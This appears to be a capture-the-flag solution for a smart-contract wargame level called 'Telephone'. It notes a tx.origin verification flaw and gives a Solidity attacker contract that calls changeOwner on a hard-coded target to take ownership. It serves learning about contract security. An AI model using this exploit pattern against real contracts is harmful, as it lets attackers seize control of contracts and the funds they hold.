# Level 4 - Telephone

- tx.origin verification vulnerability.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    address target = 0xaf964bE1c7C96C8A75DEd0BF074F72899005BBEC;

    function attack() public {
        ITelephone(target).changeOwner(msg.sender);
    }
}
```